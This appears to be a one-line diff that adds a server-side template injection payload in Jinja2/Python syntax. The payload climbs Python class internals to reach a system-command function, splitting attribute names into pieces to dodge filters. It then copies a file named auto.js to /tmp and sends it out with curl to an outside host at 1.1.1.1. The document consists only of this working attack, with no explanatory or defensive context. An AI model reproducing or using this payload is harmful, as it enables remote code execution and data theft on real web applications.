@@ -1,0 +1,1 @@
+{{ [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__('func_global' + 's')['linecache'].__dict__.values()[12].__getattribute__('s' + 'ystem')('cat auto.js > /tmp/xxx;curl -d @/tmp/xxx http://1.1.1.1')}}
